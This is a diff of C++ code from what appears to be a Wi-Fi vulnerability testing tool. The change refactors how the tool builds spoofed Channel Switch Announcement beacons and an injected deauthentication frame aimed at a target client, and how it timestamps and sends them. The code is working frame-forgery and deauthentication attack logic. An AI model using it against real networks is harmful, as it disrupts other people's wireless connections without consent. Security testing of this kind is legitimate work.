@@ -17,7 +17,9 @@
 #include "logger/report.h"
 #include "observer/observers.h"
 #include "observer/tshark_wrapper.h"
+#include "net_parser/channel_defs.h"
 #include "net_parser/dot11_defs.h"
+#include "net_parser/radiotap_defs.h"
 #include "scan/active/scan_AP.h"
 #include "system/hw_capabilities.h"
 #include "visual/result_helper.h"
@@ -29,27 +31,6 @@ using namespace Tins;
 using namespace chrono;
 
 using namespace observer::tshark;
-
-static uint8_t get_operating_class(const Channel &ch) {
-	if(ch.band == WifiBand::BAND_2_4) return 81;
-	// IEEE 802.11-2020 Table E-4, 20 MHz classes
-	const uint8_t n = ch.ch_num;
-	if(n >= 36 && n <= 48) return 115;
-	if(n >= 52 && n <= 64) return 118;
-	if(n >= 100 && n <= 140) return 121;
-	if(n >= 149 && n <= 169) return 124;
-	return n > 14 ? 115 : 81;
-}
-
-static uint8_t vht_center_ch(const uint8_t ch) {
-	// 80 MHz primary channel -> center channel
-	static constexpr array<pair<uint8_t, uint8_t>, 6> groups{
-		{ { 36, 42 }, { 52, 58 }, { 100, 106 }, { 116, 122 }, { 132, 138 }, { 149, 155 } }
-	};
-	for(auto [base, center]: groups)
-		if(ch >= base && ch < base + 16) return center;
-	return ch;
-}
 
 static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) {
 	auto opts = src.options();
@@ -69,8 +50,8 @@ static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) 
 			o = Dot11::option(Dot11::OptionTypes::HT_OPERATION, data.size(), data.data());
 		} else if(id == Dot11::OptionTypes::VHT_OP) {
 			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
-			if(data.size() >= 3 && data[0] == 1) // 80 MHz: patch center channel
-				data[1] = vht_center_ch(ap_channel.ch_num);
+			if(data.size() >= dot11::VHT_OP_MIN_SIZE && data[0] == dot11::VHT_OP_WIDTH_80MHZ)
+				data[dot11::VHT_OP_CENTER_CH0_OFF] = dot11::vht_center_ch(ap_channel.ch_num);
 			o = Dot11::option(Dot11::OptionTypes::VHT_OP, data.size(), data.data());
 		}
 	}
@@ -101,22 +82,13 @@ static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) 
 		};
 		if(ranges::find(kept_ids, static_cast<dot11::IE>(id)) == kept_ids.end()) return true; //erase
 
-		// filter out useless VENDOR_SPECIFIC IE tags
-		// allow only  00:50:F2 (type 1 - Microsoft Qos, type 2- WMM/WME)
+		// filter out useless VENDOR_SPECIFIC IEs — keep only Microsoft OUI type 1 (WPA) and type 2 (WMM/WME)
 		if(id == static_cast<uint8_t>(Dot11::OptionTypes::VENDOR_SPECIFIC)) {
-			// OUI (3B) + type (1B) - Microsoft/Wi-Fi Alliance WPA/WMM
-			static constexpr array<uint8_t, 3> ms_oui = { 0x00, 0x50, 0xF2 };
-
 			const auto *data = o.data_ptr();
-			const auto len = o.data_size();
-			if(len < 4) return true;
-
-			const bool oui_match = equal(ms_oui.begin(), ms_oui.end(), data);
-			const uint8_t type = data[3];
-
-			// type 1 = WPA IE, type 2 = WMM/WME
-			const bool wanted_type = type == 1 || type == 2;
-			return !(oui_match && wanted_type);
+			if(o.data_size() < dot11::VENDOR_SPECIFIC_OUI_TYPE_MIN) return true;
+			if(!equal(dot11::MS_OUI.begin(), dot11::MS_OUI.end(), data)) return true;
+			const uint8_t type = data[dot11::VENDOR_SPECIFIC_TYPE_OFF];
+			return type != dot11::MS_OUI_TYPE_WPA && type != dot11::MS_OUI_TYPE_WMM;
 		}
 		return false;
 	});
@@ -148,7 +120,7 @@ RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel, c
 	// ECSA IE (60): switch_mode, operating_class, new_channel, switch_count
 	// Required for 5 GHz - basic CSA IE has no operating class
 	const array<uint8_t, 4> ecsa{
-		1, get_operating_class(new_channel), new_channel.ch_num, static_cast<uint8_t>(switch_count)
+		1, dot11::get_operating_class(new_channel), new_channel.ch_num, static_cast<uint8_t>(switch_count)
 	};
 	b.add_option(Dot11::option(dot11::IE_ECSA, ecsa.size(), ecsa.data()));
 
@@ -162,30 +134,37 @@ RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel, c
 	return radiotap;
 }
 
-vector<RadioTap> get_CSA_frames(const HWAddress<6> &ap_mac, const Channel &ap_channel,
+vector<frame_raw_t> get_CSA_frames(const HWAddress<6> &ap_mac, const Channel &ap_channel,
 	const Channel &new_channel, const unique_ptr<Dot11Beacon> &beacon, const HWAddress<6> &sta_mac,
 	const bool add_deauth) {
-	vector<RadioTap> frames;
+	vector<frame_raw_t> frames;
 	for(int c = CHANNEL_SWITCH_MAX; c >= 0; --c)
-		frames.push_back(get_CSA_beacon(ap_mac, ap_channel, new_channel, c, beacon.get()));
+		frames.push_back(get_CSA_beacon(ap_mac, ap_channel, new_channel, c, beacon.get()).serialize());
 	// after switch_count=0: inject unprotected Deauth
-	// to reliably trigger SA Query on ieee80211w=1 clients that only react reactively (not proactively after CSA)
-	if(add_deauth) frames.push_back(deauth_attack::make_deauth(ap_mac, sta_mac));
+	if(add_deauth) frames.push_back(deauth_attack::make_deauth(ap_mac, sta_mac).serialize());
 	return frames;
 }
 
-void update_time_CSA_frames(vector<RadioTap> &frames) {
-	for(auto &frame : frames) {
-		if(auto *b = frame.find_pdu<Dot11Beacon>())
-			b->timestamp(duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count());
+void update_time_CSA_frames(vector<frame_raw_t> &frames) {
+	const uint64_t ts = duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count();
+	for(auto &raw : frames) {
+		const uint16_t rt_len = radiotap::get_rt_len(raw);
+		if(rt_len >= raw.size()) continue;
+		const uint8_t fc0 = raw[rt_len];
+		if(((fc0 >> dot11::FC_TYPE_SHIFT)    & dot11::FC_TYPE_MASK)    != dot11::TYPE_MGMT)   continue;
+		if(((fc0 >> dot11::FC_SUBTYPE_SHIFT) & dot11::FC_SUBTYPE_MASK) != dot11::MGMT_BEACON) continue;
+		const size_t ts_off = rt_len + dot11::MGMT_HDR_SIZE;
+		if(ts_off + sizeof(uint64_t) > raw.size()) continue;
+		for(size_t i = 0; i < sizeof(uint64_t); ++i)
+			raw[ts_off + i] = static_cast<uint8_t>(ts >> (8 * i));
 	}
 }
 
-void send_CSA_frames(PacketSender &sender, vector<RadioTap> &frames) {
-	for(auto &frame : frames) {
-		if(auto *b = frame.find_pdu<Dot11Beacon>())
-			b->timestamp(duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count());
-		sender.send(frame);
+static void send_CSA_frames(PacketSender &sender, vector<frame_raw_t> &frames) {
+	update_time_CSA_frames(frames);
+	for(const auto &raw : frames) {
+		RadioTap rt(raw.data(), raw.size());
+		sender.send(rt);
 	}
 }
 
@@ -212,7 +191,7 @@ void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, c
 		ap_channel.ch_num,
 		ssid);
 
-	vector<RadioTap> frames = get_CSA_frames(ap_mac, ap_channel, new_channel, beacon, sta_mac, true);
+	vector<frame_raw_t> frames = get_CSA_frames(ap_mac, ap_channel, new_channel, beacon, sta_mac, true);
 	while(steady_clock::now() < end_time) {
 		send_CSA_frames(sender, frames);
 		interruptible_sleep(milliseconds(ms_interval));
